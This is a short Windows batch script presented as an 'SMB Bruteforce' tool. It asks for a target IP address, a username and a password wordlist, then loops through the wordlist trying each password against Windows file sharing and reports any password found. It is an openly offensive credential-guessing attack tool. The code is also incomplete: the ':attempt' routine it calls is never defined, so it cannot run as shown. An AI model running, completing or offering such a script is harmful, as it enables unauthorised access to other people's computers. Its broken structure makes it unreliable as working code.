@echo off
title SMB Bruteforce - by Rodewaldrulez
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Computer Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

